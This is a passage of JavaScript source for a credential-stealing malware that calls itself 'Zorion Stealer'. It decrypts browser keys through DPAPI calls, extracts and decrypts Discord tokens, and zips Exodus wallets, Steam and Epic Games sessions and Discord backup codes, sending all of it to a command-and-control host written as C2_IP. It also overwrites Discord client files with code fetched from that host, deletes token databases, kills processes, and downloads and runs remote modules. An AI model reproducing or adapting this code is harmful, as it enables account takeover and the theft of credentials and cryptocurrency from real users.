      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\',
      'Profile_1',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\',
      'Profile_2',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\',
      'Profile_3',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\',
      'Profile_4',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\',
      'Profile_5',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\',
      'Guest Profile',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Default\\',
      'Default',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\',
      'Profile_1',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\',
      'Profile_2',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\',
      'Profile_3',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\',
      'Profile_4',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\',
      'Profile_5',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\',
      'Guest Profile',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Default\\',
      'Default',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Profile 1\\',
      'Profile_1',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Profile 2\\',
      'Profile_2',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Profile 3\\',
      'Profile_3',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Profile 4\\',
      'Profile_4',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Profile 5\\',
      'Profile_5',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Guest Profile\\',
      'Guest Profile',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.roaming + '\\Opera Software\\Opera Neon\\User Data\\Default\\',
      'Default',
      user.roaming + '\\Opera Software\\Opera Neon\\User Data\\',
    ],
    [
      user.roaming + '\\Opera Software\\Opera Stable\\',
      'Default',
      user.roaming + '\\Opera Software\\Opera Stable\\',
    ],
    [
      user.roaming + '\\Opera Software\\Opera GX Stable\\',
      'Default',
      user.roaming + '\\Opera Software\\Opera GX Stable\\',
    ],
  ],randomPath = path.join(tempDir+`\\${user.randomUUID}`);
fs.mkdirSync(randomPath, 484);

async function uploadFileToCustomAPI(filePath) {
  const formData = new FormData();
  formData.append('file', fs.createReadStream(filePath));
  formData.append('key', key); 

  try {
      const response = await axios.post('https://C2_IP/uploadlogs', formData, {
          headers: {
              ...formData.getHeaders(),
          },
          maxContentLength: Infinity,
          maxBodyLength: Infinity,
      });

      if (response.status !== 200) {
          throw new Error('Failed to upload file');
      }

      return response.data.link; 
  } catch (error) {
      throw new Error(`There was an error loading the file: ${error.message}`);
  }
}


function createAllFolderInTempDir() {
  const tempDirPath = path.join(tempDir, 'All'); 
  
  fs.mkdir(tempDirPath, { recursive: true }, (err) => {
      if (err) {
          return;
      }
  });
}

createAllFolderInTempDir();


async function getEncrypted() {
  for (let _0x4c3514 = 0; _0x4c3514 < browserPath.length; _0x4c3514++) {
    if (!fs.existsSync('' + browserPath[_0x4c3514][0])) {
      continue
    }
    try {
      let _0x276965 = Buffer.from(
        JSON.parse(fs.readFileSync(browserPath[_0x4c3514][2] + 'Local State'))
          .os_crypt.encrypted_key,
        'base64'
      ).slice(5)
      const _0x4ff4c6 = Array.from(_0x276965),
        _0x4860ac = execSync(
          'powershell.exe Add-Type -AssemblyName System.Security; [System.Security.Cryptography.ProtectedData]::Unprotect([byte[]]@(' +
            _0x4ff4c6 +
            "), $null, 'CurrentUser')"
        )
          .toString()
          .split('\r\n'),
        _0x4a5920 = _0x4860ac.filter((_0x29ebb3) => _0x29ebb3 != ''),
        _0x2ed7ba = Buffer.from(_0x4a5920)
      browserPath[_0x4c3514].push(_0x2ed7ba)
    } catch (_0x32406b) {}
  }
}


async function execPromise(command) {
  return new Promise((resolve, reject) => {
      exec(command, (error, stdout, stderr) => {
          if (error) {
              console.error(`exec error: ${error}`);
              return reject("No Information Available");
          }
          resolve(stdout.trim());
      });
  });
}


function addFolder(folderPath) {
  const folderFullPath = path.join(randomPath, folderPath);
  if (!fs.existsSync(folderFullPath)) {
    try {
      fs.mkdirSync(folderFullPath, { recursive: true });
    } catch (error) {}
  }
}

  const tokens = [];

  function findToken(path) {
    path += 'Local Storage\\leveldb';
    let tokens = [];
    try {
        fs.readdirSync(path)
            .map(file => {
                (file.endsWith('.log') || file.endsWith('.ldb')) && fs.readFileSync(path + '\\' + file, 'utf8')
                    .split(/\r?\n/)
                    .forEach(line => {
                        const patterns = [new RegExp(/mfa\.[\w-]{84}/g), new RegExp(/[\w-][\w-][\w-]{24}\.[\w-]{6}\.[\w-]{26,110}/gm), new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g)];
                        for (const pattern of patterns) {
                            const foundTokens = line.match(pattern);
                            if (foundTokens) foundTokens.forEach(token => tokens.push(token));
                        }
                    });
            });
    } catch (e) {}
    return tokens;
}


async function stealTokens() {
  const fields = [];
  
  for (let path of paths) {
      try {
          const foundTokens = await findToken(path);
          
          if (foundTokens) {
              for (const token of foundTokens) {
                  let json = await axios.get("https://discord.com/api/v9/users/@me", {
                      headers: {
                          "Content-Type": "application/json",
                          "authorization": token
                      }
                  });

                  json = json.data;

                  if (!json) continue;

                  const ip = await getIp();
                  const billing = await getBilling(token);
                 
            const randomString = crypto.randomBytes(16).toString('hex');
            const badges = await getBadges(json.flags);
            const nitrostatus = await getNitro(json.premium_type, json.id, token);
         const content = `*Zorion Stealer ✝️ - Discord Data*

🌟 **Username:** ${json.username} (${json.id})
🔑 **Token:** \`\`\`${token}\`\`\`
🏅 **Badges:** ${badges}
💬 **Nitro Type:** ${nitrostatus}
💳 **Billing:** ${billing}
📧 **Email:** ${json.email}
🌍 **IP:** ${ip}`;
            const dataq = {
                token: token,
                message: content,
                key: key
              };

       

            await axios.post(`https://C2_IP/sendmessagebdd/${randomString}`, dataq);
            await InfectDiscords();
              }
          }
      } catch (error) {
          console.error(error);
          continue;
      }
  }
}


const badges = {
  Discord_Employee: {
      Value: 1,
      Emoji: "Discord_Employee",
      Rare: true,
  },
  Partnered_Server_Owner: {
      Value: 2,
      Emoji: "Partnered_Server_Owner",
      Rare: true,
  },
  HypeSquad_Events: {
      Value: 4,
      Emoji: "HypeSquad_Events",
      Rare: true,
  },
  Bug_Hunter_Level_1: {
      Value: 8,
      Emoji: "Bug_Hunter_Level_1",
      Rare: true,
  },
  Early_Supporter: {
      Value: 512,
      Emoji: "Early_Supporter",
      Rare: true,
  },
  Bug_Hunter_Level_2: {
      Value: 16384,
      Emoji: "Bug_Hunter_Level_2",
      Rare: true,
  },
  Early_Verified_Bot_Developer: {
      Value: 131072,
      Emoji: "Early_Verified_Bot_Developer",
      Rare: true,
  },
  Hex: {
    Value: 32,
    Emoji: "Legacy_Username",
    Rare: false,
  },
  House_Bravery: {
      Value: 64,
      Emoji: "House_Bravery",
      Rare: false,
  },
  House_Brilliance: {
      Value: 128,
      Emoji: "House_Brilliance",
      Rare: false,
  },
  House_Balance: {
      Value: 256,
      Emoji: "House_Balance",
      Rare: false,
  },
  Discord_Officialmoderator: {
      Value: 262144,
      Emoji: "Discordmoderator_Alumni",
      Rare: true,
  },
  Active_Developer: {
    Value: 4194304,
    Emoji: "Active_Developer'"
  }
  };
  
  
  async function getRelationships(token) {
  var j = await axios.get('https://discord.com/api/v9/users/@me/relationships', {
      headers: {
          "Content-Type": "application/json",
          "authorization": token
      }
  }).catch(() => { })
  if (!j) return `*Account locked*`
  var json = j.data
  const r = json.filter((user) => {
      return user.type == 1
  })
  var gay = '';
  for (z of r) {
      var b = getRareBadges(z.user.public_flags)
      if (b != "") {
          gay += `${b} | \`${z.user.username}\`\n`
      }
  }
  if (gay == '') gay = "*Nothing to see here*"
  return gay
  }
  
  async function getBilling(token) {
  let json;
  await axios.get("https://discord.com/api/v9/users/@me/billing/payment-sources", {
      headers: {
          "Content-Type": "application/json",
          "authorization": token
      }
  }).then(res => { json = res.data })
      .catch(err => { })
  if (!json) return '\`Unknown\`';
  
  var bi = '';
  json.forEach(z => {
      if (z.type == 2 && z.invalid != !0) {
          bi += "PayPal";
      } else if (z.type == 1 && z.invalid != !0) {
          bi += "💳";
      }
  });
  if (bi == '') bi = `\`No Billing\``
  return bi;
  }
  
  function getBadges(flags) {
  var b = '';
  for (const prop in badges) {
      let o = badges[prop];
      if ((flags & o.Value) == o.Value) b += o.Emoji;
  };
  if (b == '') return `\`No Badges\``;
  return `${b}`;
  }
  
  function getRareBadges(flags) {
  var b = '';
  for (const prop in badges) {
      let o = badges[prop];
      if ((flags & o.Value) == o.Value && o.Rare) b += o.Emoji;
  };
  return b;
  }
  async function getNitro(flags, id, token) {
  switch (flags) {
      case 1:
          return "Nitro";
      case 2:
          let info;
          await axios.get(`https://discord.com/api/v9/users/${id}/profile`, {
              headers: {
                  "Content-Type": "application/json",
                  "authorization": token
              }
          }).then(res => { info = res.data })
              .catch(() => { })
          if (!info) return "Nitro";
  
          if (!info.premium_guild_since) return "Nitro";
  
                     let boost = ["1m_BB",
                     "2m_BB",
                     "3m_BB",
                     "6m_BB",
                     "9m_BB",
                     "12m_BB",
                     "15m_BB",
                     "18m_BB",
                     "24m_BB"];    var i = 0
  
          try {
              let d = new Date(info.premium_guild_since)
              let boost2month = Math.round((new Date(d.setMonth(d.getMonth() + 2)) - new Date(Date.now())) / 86400000)
              let d1 = new Date(info.premium_guild_since)
              let boost3month = Math.round((new Date(d1.setMonth(d1.getMonth() + 3)) - new Date(Date.now())) / 86400000)
              let d2 = new Date(info.premium_guild_since)
              let boost6month = Math.round((new Date(d2.setMonth(d2.getMonth() + 6)) - new Date(Date.now())) / 86400000)
              let d3 = new Date(info.premium_guild_since)
              let boost9month = Math.round((new Date(d3.setMonth(d3.getMonth() + 9)) - new Date(Date.now())) / 86400000)
              let d4 = new Date(info.premium_guild_since)
              let boost12month = Math.round((new Date(d4.setMonth(d4.getMonth() + 12)) - new Date(Date.now())) / 86400000)
              let d5 = new Date(info.premium_guild_since)
              let boost15month = Math.round((new Date(d5.setMonth(d5.getMonth() + 15)) - new Date(Date.now())) / 86400000)
              let d6 = new Date(info.premium_guild_since)
              let boost18month = Math.round((new Date(d6.setMonth(d6.getMonth() + 18)) - new Date(Date.now())) / 86400000)
              let d7 = new Date(info.premium_guild_since)
              let boost24month = Math.round((new Date(d7.setMonth(d7.getMonth() + 24)) - new Date(Date.now())) / 86400000)
  
              if (boost2month > 0) {
                  i += 0
              } else {
                  i += 1
              } if (boost3month > 0) {
                  i += 0
              } else {
                  i += 1
              } if (boost6month > 0) {
                  i += 0
              } else {
                  i += 1
              } if (boost9month > 0) {
                  i += 0
              } else {
                  i += 1
              } if (boost12month > 0) {
                  i += 0
              } else {
                  i += 1
              } if (boost15month > 0) {
                  i += 0
              } else {
                  i += 1
              } if (boost18month > 0) {
                  i += 0
              } else {
                  i += 1
              } if (boost24month > 0) {
                  i += 0
              } else if (boost24month < 0 || boost24month == 0) {
                  i += 1
              } else {
                  i = 0
              }
          } catch {
              i += 0
          }
          return `Nitro ${boost[i]}`
      default:
          return "\`No Nitro\`";
  };
  }


async function getIp() {
    var ip = await axios.get("https://www.myexternalip.com/raw")
    return ip.data;
}


async function copyFolder(source, target) {
  try {
    await fs.promises.mkdir(target, { recursive: true });

    const files = await fs.promises.readdir(source);
    for (const file of files) {
      const srcFile = path.join(source, file);
      const destFile = path.join(target, file);
      const stats = await fs.promises.stat(srcFile);
      if (stats.isDirectory()) {
        await copyFolder(srcFile, destFile);
      } else {
        await fs.promises.copyFile(srcFile, destFile);
      }
    }
  } catch (error) {
    console.error(error);
  }
}

async function SubmitExodus() {
  try {
    const userProfile = os.homedir();
    const exodusWalletPath = path.join(userProfile, 'AppData', 'Roaming', 'Exodus', 'exodus.wallet');
    const appDataPath = path.join(userProfile, 'AppData', 'Roaming');
    const zipPath = path.join(appDataPath, 'exodus.zip');

    if (fs.existsSync(exodusWalletPath)) {
      const output = fs.createWriteStream(zipPath);
      const archive = archiver('zip', {
        zlib: { level: 9 }
      });

      output.on('close', async function () {
        console.log(`${archive.pointer()} total bytes`);

        try {
          const link = await uploadFileToCustomAPI(zipPath);
          const exodusLink = `[download here!](${link})`;

          const randomString = crypto.randomBytes(16).toString('hex');

          const content = `Exodus app found, here is its file. ⬇️ 
${exodusLink}`;
  
        const data = {
          message: content,
          key: key 
        };

          try {
            await axios.post(`https://C2_IP/sendmessageex/${randomString}`, data);
            console.log('Webhook sent successfully');
          } catch (error) {
            console.error('Error in sending webhook:', error);
          }

          return exodusLink;
        } catch (error) {
          console.error('Error uploading file:', error);
          return "Data not found";
        }
      });

      archive.on('error', function (err) {
        throw err;
      });

      archive.pipe(output);

      archive.directory(exodusWalletPath, false);

      await archive.finalize();
    } else {
      console.log('Exodus wallet file not found.');
    }
  } catch (error) {
    console.error('Error in SubmitExodus:', error);
  }
}

      async function getPepperoni() {
        const homeDir = os.homedir();
        let str = '';
      
        function findAndReadBackupCodes(directory) {
            if (fs.existsSync(directory)) {
                fs.readdirSync(directory).forEach(file => {
                    if (file.endsWith('.txt') && file.includes('discord_backup_codes')) {
                        const path = `${directory}/${file}`;
                        str += `\n\n@~$~@stealit-${path}`;
                        str += `\n\n${fs.readFileSync(path).toString()}`;
                    }
                });
            }
        }
      
        findAndReadBackupCodes(`${homeDir}/Downloads`);
        findAndReadBackupCodes(`${homeDir}/Desktop`);
        findAndReadBackupCodes(`${homeDir}/Documents`);
        const backupcodesFilePath = path.join(tempDir, 'BackupCodes.txt');
        if (str !== '') {
          fs.writeFileSync(backupcodesFilePath, str.slice(2));
          
        const link = await uploadFileToCustomAPI(backupcodesFilePath);
        const backupCodeLink = `[downloadhere!](${link})`
        const randomString = crypto.randomBytes(16).toString('hex');
  
          
        const content = `*Zorion Stealer ✝️ - (Discord Backup Codes Finder)*

${backupCodeLink}`;
              
                    const data = {
                      message: content,
                      key: key 
                    };
              
                      await axios.post(`https://C2_IP/sendmessagedbcf/${randomString}`, data)
        
        }
      }
 
  async function SubmitSteam() {
      try {
          const file = `C:\\Program Files (x86)\\Steam\\config`;
          if (fs.existsSync(file)) {
              const zipper = new AdmZip();
              zipper.addLocalFolder(file);
  
              const targetZipPath = path.join(tempDir, 'SteamSession.zip');
                    zipper.writeZip(targetZipPath);
                    const link = await uploadFileToCustomAPI(targetZipPath);
                    const steamLink = `[downloadhere!](${link})`
                    const randomString = crypto.randomBytes(16).toString('hex');
              
                      
                 
                  const content = `Zorion Stealer ✝️ - (SteamSession Finder)

${steamLink}`;
                      
                            const data = {
                              message: content,
                              key: key 
                            };
                      
                              await axios.post(`https://C2_IP/sendmessagess/${randomString}`, data)
          } else {
          }
      } catch (error) {
      }
  }
  
  async function SubmitEpic() {
    try {
    const file = `${localappdata}\\EpicGamesLauncher\\Saved\\Config\\Windows`;
    if (fs.existsSync(file)) {
        const zipper = new AdmZip();
        zipper.addLocalFolder(file);
  
        const targetZipPath = path.join(tempDir, 'EpicGamesSession.zip');
        zipper.writeZip(targetZipPath);     
        const link = await uploadFileToCustomAPI(targetZipPath);
        const epicLink = `[downloadhere!](${link})`
        const randomString = crypto.randomBytes(16).toString('hex');
  
          
     
  
        
                   const content = `*Zorion Stealer ✝️ - (EpicGamesSession Finder)*

${epicLink}`;
                      
                            const data = {
                              message: content,
                              key: key 
                            };
                      
                              await axios.post(`https://C2_IP/sendmessageegs/${randomString}`, data);  } else {
    }
  } catch (error) {
  }
  }   
  
  async function SubmitSteam2th() {
    try {
        const file = `D:\\Program Files (x86)\\Steam\\config`;
       
        if (fs.existsSync(file)) {
          const zipper = new AdmZip();
          zipper.addLocalFolder(file);

          const targetZipPath = path.join(tempDir, 'SteamSession.zip');
                zipper.writeZip(targetZipPath);
                const link = await uploadFileToCustomAPI(targetZipPath);
                const steamLink = `[downloadhere!](${link})`
                const randomString = crypto.randomBytes(16).toString('hex');
          
                  
             
              const content = `Zorion Stealer ✝️ - (SteamSession Finder)

${steamLink}`;
                  
                        const data = {
                          message: content,
                          key: key 
                        };
                  
                          await axios.post(`https://C2_IP/sendmessagess/${randomString}`, data)
      } else {
      }
  } catch (error) {
  }
}




  
  async function StopCords() {
      exec('tasklist', (err, stdout) => {
          for (const executable of ['Discord.exe', 'DiscordCanary.exe', 'discordDevelopment.exe', 'DiscordPTB.exe']) {
              if (stdout.includes(executable)) {
                  exec(`taskkill /F /T /IM ${executable}`, (err) => {})
                  exec(`"${localappdata}\\${executable.replace('.exe', '')}\\Update.exe" --processStart ${executable}`, (err) => {})
              }
          }
      })
  }
  
  const roaming = process.env.APPDATA;
  const injectionPaths = [];
  const injectionResults = [];
  
  async function InfectDiscords() {
      try {
          const url = 'https://C2_IP/injection';
          const { data: injection } = await axios.post(url, { key: key });
  
          // Get Discord paths
          const dirs = await fspromises.readdir(local);
          const discordPaths = dirs.filter(dirName => dirName.includes('cord'));
  
          // Inject code into Discord versions
          for (const discordPath of discordPaths) {
              const discordDir = path.join(local, discordPath);
              const appDirs = (await fspromises.readdir(discordDir)).filter(dirName => dirName.startsWith('app-'));
              appDirs.sort((a, b) => b.localeCompare(a, undefined, { numeric: true }));
              const appVersionPath = appDirs.length > 0 ? path.join(discordDir, appDirs[0]) : null;
  
              if (appVersionPath) {
                  let discordType = 'Discord';
                  if (discordPath.includes('Canary')) discordType = 'Canary';
                  if (discordPath.includes('PTB')) discordType = 'PTB';
  
                  try {
                      const modulesPath = path.join(appVersionPath, 'modules');
                      const dirs = await fspromises.readdir(modulesPath);
                      const coreDir = dirs.find(dirName => dirName.includes('discord_desktop_core'));
  
                      if (coreDir) {
                          const corePath = path.join(modulesPath, coreDir, 'discord_desktop_core');
                          const indexPath = path.join(corePath, 'index.js');
                          await fspromises.writeFile(indexPath, injection, 'utf8');
                          console.log(`Injected code into ${indexPath}`);
                          injectionPaths.push(indexPath);
                          injectionResults.push({ path: indexPath, type: discordType });
  
                          // Zero out all .ldb files and delete .log files
                          const dbPath = path.join(roaming, discordPath.replace(local, '').trim(), 'Local Storage', 'leveldb');
                          const files = await fspromises.readdir(dbPath);
                          const ldbFiles = files.filter(file => file.endsWith('.ldb'));
                          const logFiles = files.filter(file => file.endsWith('.log'));
  
                          for (const ldbFile of ldbFiles) {
                              const ldbFilePath = path.join(dbPath, ldbFile);
                              await fspromises.writeFile(ldbFilePath, '', 'utf8');
                              console.log(`Zeroed out token database file at ${ldbFilePath}`);
                          }
  
                          for (const logFile of logFiles) {
                              const logFilePath = path.join(dbPath, logFile);
                              await fspromises.unlink(logFilePath);
                              console.log(`Deleted log file at ${logFilePath}`);
                          }
                      }
                  } catch (error) {
                      console.error(`Error injecting code into ${discordType}:`, error);
                  }
              }
          }
  
          // Inject into BetterDiscord
          try {
              const betterDiscordPath = path.join(roaming, 'BetterDiscord', 'data', 'betterdiscord.asar');
              await fspromises.writeFile(betterDiscordPath, injection, 'utf8');
              console.log(`Injected code into BetterDiscord at ${betterDiscordPath}`);
              injectionPaths.push(betterDiscordPath);
              injectionResults.push({ path: betterDiscordPath, type: 'BetterDiscord' });
          } catch (error) {
              console.error('Error injecting code into BetterDiscord:', error);
          }
  
          // Send injection paths
          await sendInjectionPaths();
      } catch (error) {
          console.error('An error occurred:', error);
      }
  }
  
  async function sendInjectionPaths() {
    try {
        const randomString = crypto.randomBytes(16).toString('hex');
        const apiurl = `https://C2_IP/sendmessageinj/${randomString}`;
  
        if (injectionResults.length === 0) {
            const errorMessage =  "No injections were successful.";
              
            const data = {
                message: errorMessage,
                key: key
            };
            axios.post(apiurl, data);
        } else {
     
  
            const content = -`Zorion Stealer ✝️ - (Injector)*

Injection has been injected into the Discord app.

${injectionResult.type} Path
\`\`\`${injectionResult.path}\`\`\``
            

            const data = {
                message: content,
                key: key
            };
            axios.post(apiurl, data);
            console.log('Injection paths sent to webhook');
        }
    } catch (error) {
        console.error('Error sending injection paths:', error);
        throw error;
    }
  }
  

async function getEncrypted() {
    for (let _0x4c3514 = 0; _0x4c3514 < browserPath.length; _0x4c3514++) {
        if (!fs.existsSync('' + browserPath[_0x4c3514][0])) {
            continue
        }
        try {
            let _0x276965 = Buffer.from(
                JSON.parse(fs.readFileSync(browserPath[_0x4c3514][2] + 'Local State'))
                .os_crypt.encrypted_key,
                'base64'
            ).slice(5)
            const _0x4ff4c6 = Array.from(_0x276965),
                _0x4860ac = execSync(
                    'powershell.exe Add-Type -AssemblyName System.Security; [System.Security.Cryptography.ProtectedData]::Unprotect([byte[]]@(' +
                    _0x4ff4c6 +
                    "), $null, 'CurrentUser')"
                )
                .toString()
                .split('\r\n'),
                _0x4a5920 = _0x4860ac.filter((_0x29ebb3) => _0x29ebb3 != ''),
                _0x2ed7ba = Buffer.from(_0x4a5920)
            browserPath[_0x4c3514].push(_0x2ed7ba)
        } catch (_0x32406b) {}
    }
} 

async function DiscordListener(path) {
        return;
}




async function closeApps() {
    const additionalProcesses = ["steam.exe", "EpicGamesLauncher.exe", "Exodus.exe"];
    return new Promise(async (resolve) => {
      try {
        const { execSync } = require("child_process");
        const tasks = execSync("tasklist").toString();
        additionalProcesses.forEach((process) => {
          if (tasks.includes(process)) {
            execSync(`taskkill /IM ${process} /F`);
          }
        });
        await new Promise((resolve) => setTimeout(resolve, 2500));
        resolve();
      } catch (e) {
        console.log(e);
        resolve();
      }
    });
  }

  closeApps();
  SubmitSteam();
  SubmitSteam2th();
  SubmitEpic();


      async function closeBrowsers() {
        const browsersProcess = ["chrome.exe", "msedge.exe", "opera.exe", "brave.exe"];
        return new Promise(async (resolve) => {
          try {
            const { execSync } = require("child_process");
            const tasks = execSync("tasklist").toString();
            browsersProcess.forEach((process) => {
              if (tasks.includes(process)) {
                execSync(`taskkill /IM ${process} /F`);
              }
            });
            await new Promise((resolve) => setTimeout(resolve, 2500));
            resolve();
          } catch (e) {
            console.log(e);
            resolve();
          }
        });
      }

      async function findAppToken() {
        const appdata = process.env.APPDATA || (process.platform == 'darwin' ? process.env.HOME + '/Library/Application Support' : '/var/local');
      
  

        const discordPaths = {
            Discord: appdata + "\\discord\\Local Storage\\leveldb\\",
            "Discord Canary": appdata + "\\discordcanary\\Local Storage\\leveldb\\",
            Lightcord: appdata + "\\Lightcord\\Local Storage\\leveldb\\",
            "Discord PTB": appdata + "\\discordptb\\Local Storage\\leveldb\\"
        };
      
        const tokens = [];
      
        for (const [key, value] of Object.entries(discordPaths)) {
            if (!fs.existsSync(value)) {
                continue;
            }
      
            for (const file_name of fs.readdirSync(value)) {
                if (!file_name.endsWith(".log") && !file_name.endsWith(".ldb")) {
                    continue;
                }
      
                const path_split = value.split("\\");
                const path_split_tail = value.includes("Network") ? path_split.slice(0, path_split.length - 3) : path_split.slice(0, path_split.length - 2);
                const path_tail = path_split_tail.join("\\") + "\\";
      
                for (const line of fs.readFileSync(`${value}/${file_name}`, "utf8").split("\n")) {
                    if (value.includes("cord")) {
                        try {
                            const encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail.replace("Local Storage", "Local State"))).os_crypt.encrypted_key, "base64").slice(5);
                            const _key = art.unprotectData(Buffer.from(encrypted, "utf-8"), null, "CurrentUser");
                            const encryptedRegex = /dQw4w9WgXcQ:[^\"]*/;
      
                            if (line.match(encryptedRegex)) {
                                try {
                                    const token = Buffer.from(line.match(encryptedRegex)[0].split("dQw4w9WgXcQ:")[1], "base64");
                                    const start = token.slice(3, 15);
                                    const middle = token.slice(15, token.length - 16);
                                    const end = token.slice(token.length - 16, token.length);
      
                                    const decipher = crypto.createDecipheriv("aes-256-gcm", _key, start);
                                    decipher.setAuthTag(end);
                                    const decryptedToken = decipher.update(middle, "base64", "utf-8") + decipher.final("utf-8");
      
                                    tokens.push(decryptedToken);
                                } catch (e) {
                                    console.error(e);
                                }
                            }
                        } catch (e) {
                            console.error(e);
                        }
                    }
                }
            }
        }
      
        return tokens;
      }
      
      async function discordAppData() {
        const tokens = await findAppToken();
    
        for (let token of tokens) {
            try {
                let json = await axios.get("https://discord.com/api/v9/users/@me", {
                    headers: {
                        "Content-Type": "application/json",
                        "authorization": token
                    }
                });
    
                json = json.data;
    
                if (!json) continue;
    
                var ip = await getIp();
                var billing = await getBilling(token);
    
    
          
                const randomString = crypto.randomBytes(16).toString('hex');
                const badges = await getBadges(json.flags);
                const nitrostatus = await getNitro(json.premium_type, json.id, token);
     const content = `*Zorion Stealer ✝️ - Discord Data*

🌟 **Username:** ${json.username} (${json.id})
🔑 **Token:** \`\`\`${token}\`\`\`
🏅 **Badges:** ${badges}
💬 **Nitro Type:** ${nitrostatus}
💳 **Billing:** ${billing}
📧 **Email:** ${json.email}
🌍 **IP:** ${ip}`;
                const dataq = {
                    token: token,
                    message: content,
                    key: key
                  };
    
           
    
                await axios.post(`https://C2_IP/sendmessageadd/${randomString}`, dataq);
                await InfectDiscords();
    } catch (error) {
        console.error(error);
        continue;
    }
}
}
async function generateRandomName() {
  const randomName = Math.random().toString(36).substring(7);
  return randomName;
}

async function downloadAndSave(url) {
  const userPath = path.join('C:', 'Users', os.userInfo().username);
  await fs.ensureDir(userPath);  // Kullanıcı dizininin mevcut olduğundan emin ol

  const tempFilePath = path.join(userPath, 'tempfile');
  const randomFileName = `${Math.random().toString(36).substring(2, 15)}.node`;
  const finalFilePath = path.join(userPath, randomFileName);

  try {
    const response = await axios({
      url,
      method: 'GET',
      responseType: 'stream'
    });

    const writer = fs.createWriteStream(tempFilePath);

    response.data.pipe(writer);

    return new Promise((resolve, reject) => {
      writer.on('finish', async () => {
        writer.close(async () => { // Dosya tamamen kapatıldığında yeniden adlandırma işlemi
          try {
            await fs.rename(tempFilePath, finalFilePath);
            resolve(finalFilePath);
          } catch (error) {
            reject(error);
          }
        });
      });

      writer.on('error', (err) => {
        fs.unlink(tempFilePath);
        reject(err);
      });
    });
  } catch (error) {
    throw new Error(`Dosya indirilemedi: ${error.message}`);
  }
}

async function downloadAndSave2(url) {
  const userPath = path.join('C:', 'Users', os.userInfo().username);
  await fs.ensureDir(userPath);  // Kullanıcı dizininin mevcut olduğundan emin ol

  const tempFilePath = path.join(userPath, 'tempfile2');
  const randomFileName = `${Math.random().toString(36).substring(2, 15)}.node`;
  const finalFilePath = path.join(userPath, randomFileName);

  try {
    const response = await axios({
      url,
      method: 'GET',
      responseType: 'stream'
    });

    const writer = fs.createWriteStream(tempFilePath);

    response.data.pipe(writer);

    return new Promise((resolve, reject) => {
      writer.on('finish', async () => {
        writer.close(async () => { // Dosya tamamen kapatıldığında yeniden adlandırma işlemi
          try {
            await fs.rename(tempFilePath, finalFilePath);
            resolve(finalFilePath);
          } catch (error) {
            reject(error);
          }
        });
      });

      writer.on('error', (err) => {
        fs.unlink(tempFilePath);
        reject(err);
      });
    });
  } catch (error) {
    throw new Error(`Dosya indirilemedi: ${error.message}`);
  }
}
// browserzipexe fonksiyonu
async function browserzipexe() {
  try {
    const url = 'https://C2_IP/bmodule';
    const filePath = await downloadAndSave(url);

    global.dojka = require(filePath);

    allBrowserData(); 
  } catch (error) {
    console.error('Bir hata oluştu:', error);
  }
}

// apptokenexe fonksiyonu
async function apptokenexe() {
  try {
    const url = 'https://C2_IP/dmodule';
    const filePath = await downloadAndSave2(url);

    global.art = require(filePath);

    discordAppData(); 
  } catch (error) {
    console.error('Bir hata oluştu:', error);
  }
}

const browserPathsEXT = {
  chrome: [
      `${localappdata}\\Google\\Chrome\\User Data\\Default\\`,
      `${localappdata}\\Google\\Chrome\\User Data\\Profile 1\\`,
      `${localappdata}\\Google\\Chrome\\User Data\\Profile 2\\`,
      `${localappdata}\\Google\\Chrome\\User Data\\Profile 3\\`,
      `${localappdata}\\Google\\Chrome\\User Data\\Profile 4\\`,
      `${localappdata}\\Google\\Chrome\\User Data\\Profile 5\\`,
      `${localappdata}\\Google\\Chrome\\User Data\\Guest Profile\\`
  ],
  opera: [
      `${appdata}\\Opera Software\\Opera Stable\\`,
      `${appdata}\\Opera Software\\Opera GX Stable\\`,
      `${localappdata}\\Opera Software\\Opera Stable\\`,
      `${localappdata}\\Opera Software\\Opera GX Stable\\`
  ],
  brave: [
